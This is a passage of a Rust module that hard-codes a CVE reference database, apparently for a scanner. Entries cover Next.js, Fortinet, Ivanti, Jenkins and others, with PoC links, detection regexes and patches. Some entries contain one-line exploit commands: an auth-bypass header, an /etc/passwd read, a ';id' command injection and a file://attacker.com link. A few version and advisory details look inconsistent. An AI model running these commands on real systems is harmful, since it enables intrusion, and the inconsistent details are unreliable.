            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "Critical",
            &[
                "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability"
            ],
            &[],
            &["cves/2024/CVE-2024-21413.yaml"],
            &[r"file://.*!"],
            &["Click link: file://attacker.com!C:/Windows/System32/calc.exe"],
            "Install Microsoft February 2024 updates.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413"],
            &["rce", "outlook", "monikerlink"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-24809",
            false,
            "WinRAR Mark-of-the-Web Bypass",
            "WinRAR allows extraction of files that bypass Mark-of-the-Web protections.",
            "WinRAR",
            &["6.23"],
            1386,
            "Security-Feature-Bypass",
            7.8,
            "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "High",
            &[],
            &[],
            &[],
            &[],
            &[],
            "Update WinRAR to 6.24+.",
            &["https://www.rarlab.com/rarnew.htm"],
            &["motw", "windows", "winrar"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2025-29927",
            true,
            "Next.js Middleware Authorization Bypass",
            "A specially crafted x-middleware-subrequest header can bypass authorization checks implemented in Next.js middleware, granting unauthenticated access to protected routes.",
            "Next.js",
            &["12.3.4", "13.5.8", "14.2.24", "15.2.2"],
            285,
            "Authentication-Bypass",
            9.1,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "Critical",
            &["https://github.com/kOaDT/poc-cve-2025-29927"],
            &["exploit/multi/http/nextjs_middleware_auth_bypass"],
            &["cves/2025/CVE-2025-29927.yaml"],
            &[r"(?i)x-middleware-subrequest"],
            &["curl -i -H \"x-middleware-subrequest: middleware\" http://target:3000/dashboard"],
            "Upgrade to Next.js 12.3.5, 13.5.9, 14.2.25, or 15.2.3+. Strip the x-middleware-subrequest header at the reverse proxy.",
            &["https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw"],
            &["auth-bypass", "nextjs", "middleware", "header"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2024-47575",
            true,
            "FortiManager Authentication Bypass",
            "A missing authentication for critical function vulnerability in FortiManager's fgfmd daemon allows a remote unauthenticated attacker to execute arbitrary code or commands on managed devices via crafted requests.",
            "Fortinet FortiManager",
            &["7.0", "7.2", "7.4"],
            306,
            "Authentication-Bypass",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/watchtowrlabs/FortiManager-CVE-2024-47575"],
            &["exploit/linux/http/fortimanager_fgfmd_auth_bypass"],
            &["cves/2024/CVE-2024-47575.yaml"],
            &[r"fgfmd", r"FortiManager.*daemon"],
            &["python3 CVE-2024-47575.py -t https://target:541"],
            "Upgrade FortiManager to 7.0.13, 7.2.9, 7.4.4+ immediately.",
            &["https://www.fortiguard.com/psirt/FG-IR-24-423"],
            &["auth-bypass", "fortinet", "cve-2024"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2025-0282",
            true,
            "Ivanti Connect Secure Stack-Based Buffer Overflow",
            "A stack-based buffer overflow in Ivanti Connect Secure, Policy Secure, and Neurons for ZTA allows unauthenticated remote attackers to achieve code execution.",
            "Ivanti Connect Secure",
            &["22.7", "22.7R1", "22.6", "22.6R2"],
            121,
            "Buffer-Overflow",
            9.0,
            "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            "Critical",
            &["https://github.com/watchtowrlabs/Ivanti-Connect-Secure-Exploit-CVE-2025-0282"],
            &["exploit/linux/http/ivanti_connect_secure_rce"],
            &["cves/2025/CVE-2025-0282.yaml"],
            &[r"\.css\.ico", r"Ivanti.*ICS"],
            &["python3 CVE-2025-0282.py --target https://target"],
            "Apply vendor patches immediately; treat systems as compromised if exposed.",
            &["https://forums.ivanti.com/s/article/Security-Advisory-EPM-January-2025"],
            &["rce", "ivanti", "vpn", "buffer-overflow"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2024-38063",
            true,
            "Windows TCP/IP IPv6 RCE",
            "An integer underflow in Windows TCP/IP stack's IPv6 processing allows remote code execution when an attacker sends crafted IPv6 packets.",
            "Microsoft Windows",
            &["10 22H2", "11 23H2", "Server 2022"],
            191,
            "RCE",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/ynwarcs/CVE-2024-38063"],
            &[],
            &["cves/2024/CVE-2024-38063.yaml"],
            &[r"IPv6.*tcpip\.sys", r"6LoWPAN"],
            &["python3 cve-2024-38063.py <interface> <target-ipv6>"],
            "Apply August 2024 Windows updates. Disable IPv6 only if not required.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063"],
            &["rce", "windows", "ipv6", "network"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2023-22527",
            true,
            "Confluence SSTI RCE",
            "A template injection vulnerability in older versions of Confluence Data Center and Server allows remote unauthenticated attackers to execute arbitrary code on the server.",
            "Atlassian Confluence",
            &["8.0", "8.5.0", "8.5.4"],
            1336,
            "SSTI-RCE",
            10.0,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/Chocapikk/CVE-2023-22527"],
            &["exploit/multi/http/confluence_ssti_rce"],
            &["cves/2023/CVE-2023-22527.yaml"],
            &[r"\/template\/aui\/text-inline\.vm", r"\$stack\.findValue"],
            &[
                "curl -X POST 'http://target/template/aui/text-inline.vm' --data 'label=...&value=...'"
            ],
            "Upgrade to Confluence 7.19.16, 8.3.4, 8.5.3, 8.6.2+ or apply the provided mitigation.",
            &[
                "https://confluence.atlassian.com/security/cve-2023-22527-rce-command-line-mitigation-1314458678.html"
            ],
            &["rce", "ssti", "confluence", "atlassian"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2024-23897",
            true,
            "Jenkins Arbitrary File Read",
            "Jenkins's CLI file parsing uses args4j, allowing unauthenticated attackers to read arbitrary files on the Jenkins controller by exploiting expanded options.",
            "Jenkins",
            &["2.441", "LTS 2.426.2"],
            200,
            "File-Read",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/vishi233/CVE-2024-23897"],
            &["exploit/multi/http/jenkins_read_arbitrary_files"],
            &["cves/2024/CVE-2024-23897.yaml"],
            &[r"java\.util\.concurrent\.CancellationException"],
            &[
                "printf 'connect-node' | java -jar jenkins-cli.jar -s http://target -http /etc/passwd"
            ],
            "Upgrade Jenkins to 2.442, LTS 2.426.3+. Restrict anonymous access to CLI.",
            &["https://www.jenkins.io/security/advisory/2024-01-24/"],
            &["file-read", "jenkins", "cli", "args4j"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2023-48795",
            false,
            "OpenSSH Terrapin Prefix Truncation",
            "The SSH transport protocol allows a man-in-the-middle to truncate extension negotiation messages (CHATTER before SSH_MSG_EXT_INFO), weakening channel integrity.",
            "OpenSSH",
            &["9.5", "9.6", "all supported versions"],
            924,
            "Protocol-Weakening",
            5.9,
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "Medium",
            &["https://github.com/RUB-NDS/Terrapin-Attack"],
            &[],
            &["cves/2023/CVE-2023-48795.yaml"],
            &[r"SSH_MSG_EXT_INFO", r"terrapin"],
            &["python3 terrapin-scanner --host target --port 22"],
            "Upgrade OpenSSH to 9.6+ and enable strict key exchange (RFC 9129) where possible.",
            &["https://www.openssh.com/txt/release-9.6"],
            &["ssh", "mitm", "protocol", "openssh"],
            "A02:2021-Cryptographic-Failures"
        ),
        cve!(
            "CVE-2023-36845",
            true,
            "Juniper EX Series PHP Environment RCE",
            "A php-cgi environment variable manipulation vulnerability in Juniper EX switches allows unauthenticated attackers to execute arbitrary code via crafted requests.",
            "Juniper EX",
            &["22.3R1", "22.4R1", "23.2R1"],
            77,
            "Command-Injection",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/watchtowrlabs/Juniper-CVE-2023-36845-EX-Switch"],
            &["exploit/linux/http/juniper_ex_php_rce"],
            &["cves/2023/CVE-2023-36845.yaml"],
            &[r"PHPRC", r"webauth_operation"],
            &["curl -i 'http://target/webauth_operation.php?PHPRC=/tmp/'"],
            "Apply Juniper security advisory JSA73172 patches. Disable unauthenticated access to web authentication pages.",
            &[
                "https://supportportal.juniper.net/s/article/2023-08-Security-Bulletin-Junos-OS-EX-EX4400-RCE-CVE-2023-36845"
            ],
            &["rce", "juniper", "switch", "php"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2023-27350",
            true,
            "PaperCut NG/MF Authentication Bypass RCE",
            "An authentication bypass in PaperCut NG/MF setup endpoints allows remote attackers to create an admin user and achieve code execution.",
            "PaperCut NG/MF",
            &["20.1.0", "22.0.9"],
            287,
            "Authentication-Bypass",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/mauricelambert/CVE-2023-27350"],
            &["exploit/multi/http/papercut_auth_bypass"],
            &["cves/2023/CVE-2023-27350.yaml"],
            &[r"\/app\/setup\/setup\.html", r"set-printer"],
            &[
                "curl -X POST http://target:9191/app/setup/setup.html --data 'username=...&password=...'"
            ],
            "Upgrade to PaperCut 20.1.7, 21.2.11, 22.0.9+. Disable external access to the admin interface.",
            &["https://www.papercut.com/support/knowledge-base/security-advisories/"],
            &["rce", "papercut", "auth-bypass"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2024-21762",
            true,
            "FortiOS Out-of-Bounds Write RCE",
            "An out-of-bounds write in FortiOS SSL VPN allows a remote unauthenticated attacker to execute arbitrary code or commands via specially crafted HTTP requests.",
            "Fortinet FortiOS",
            &["7.4.0", "7.4.1", "7.2.0", "7.2.5"],
            787,
            "Buffer-Overflow",
            9.6,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/watchtowrlabs/CVE-2024-21762"],
            &["exploit/linux/http/fortios_ssl_vpn_oob_write"],
            &["cves/2024/CVE-2024-21762.yaml"],
            &[r"ssl-vpn", r"FortiOS"],
            &["python3 CVE-2024-21762.py --target https://target:10443"],
            "Upgrade FortiOS to 7.4.2, 7.2.6, 7.0.14+ immediately. Restrict SSL VPN access.",
            &["https://www.fortiguard.com/psirt/FG-IR-24-015"],
            &["rce", "fortinet", "ssl-vpn", "buffer-overflow"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-21887",
            true,
            "Ivanti Connect Secure Command Injection",
            "Command injection in Ivanti Connect Secure and Policy Secure web components allows unauthenticated attackers to execute arbitrary commands.",
            "Ivanti Connect Secure",
            &["9.1R18", "22.7R2"],
            77,
            "Command-Injection",
            9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/horizon3ai/CVE-2024-21887"],
            &["exploit/linux/http/ivanti_connect_secure_rce"],
            &["cves/2024/CVE-2024-21887.yaml"],
            &[r"\/dana-na\/auth", r"setAdminPassword"],
            &["curl -k 'https://target/dana-na/auth/url_default/welcome.cgi?foo=1;id'"],
            "Apply Ivanti patches for 9.1R18.2, 22.7R2.1+. Check for indicators of compromise.",
            &["https://forums.ivanti.com/s/article/CVE-2024-21887"],
            &["rce", "ivanti", "vpn", "command-injection"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2024-4879",
            true,
            "ServiceNow GlideExpression Injection",
            "An input validation flaw in ServiceNow's GlideExpression class allows unauthenticated attackers to execute arbitrary commands on the instance.",
            "ServiceNow",
            &["Washington DC", "Vancouver", "Utah"],
            94,
            "Code-Injection",
            9.3,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "Critical",
            &["https://github.com/blackmagic2023/ServiceNow-CVE-2024-4879"],
            &["exploit/multi/http/servicenow_glideexpression_rce"],
            &["cves/2024/CVE-2024-4879.yaml"],
            &[r"glideExpression", r"sys_user\.table"],
            &["curl -k 'https://target/xmlhttp.do?jvar_page_title=...'"],
            "Upgrade to the patched ServiceNow release (Washington DC patch 10+ or equivalent).",
            &["https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1714382"],
            &["rce", "servicenow", "glideexpression"],
            "A03:2021-Injection"
        ),
    ]
}

/// Load additional CVE entries shipped as JSON.
fn additional_cves() -> &'static Vec<CveEntry> {
    static ADDITIONAL: OnceLock<Vec<CveEntry>> = OnceLock::new();
    ADDITIONAL.get_or_init(|| {
        const JSON: &str = include_str!("../data/additional_cves.json");
        serde_json::from_str::<Vec<CveEntry>>(JSON).unwrap_or_default()
    })
}

/// Build the full CVE database with base records and additional JSON entries.
pub fn get_cve_database() -> Vec<CveEntry> {
    let mut db = base_cves();
    db.extend(additional_cves().iter().cloned());
    db
}

/// Lookup a single CVE by ID.
pub fn lookup_cve(cve_id: &str) -> Option<CveEntry> {
    get_cve_database()
        .into_iter()
        .find(|e| e.cve_id.eq_ignore_ascii_case(cve_id))
}

/// Find CVEs matching a specific attack type.
pub fn find_by_attack_type(attack_type: &str) -> Vec<CveEntry> {
    get_cve_database()
        .into_iter()
        .filter(|e| e.attack_type.eq_ignore_ascii_case(attack_type))
        .collect()
}

/// Find CVEs affecting a component name substring.
pub fn find_by_component(component: &str) -> Vec<CveEntry> {
    let lower = component.to_lowercase();
    get_cve_database()
        .into_iter()
        .filter(|e| e.affected_component.to_lowercase().contains(&lower))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cve_database_size() {
        let db = get_cve_database();
        assert!(
            db.len() >= 500,
            "CVE database should contain at least 500 entries, got {}",
            db.len()
        );
    }

    #[test]
    fn test_lookup_known_cve() {
        assert!(lookup_cve("CVE-2021-44228").is_some());
        assert!(lookup_cve("CVE-2024-6387").is_some());
    }

    #[test]
    fn test_find_by_attack_type_not_empty() {
        let entries = find_by_attack_type("RCE");
        assert!(!entries.is_empty());
    }

    #[test]
    fn test_find_by_component() {
        let entries = find_by_component("Apache");
        assert!(!entries.is_empty());
    }
}
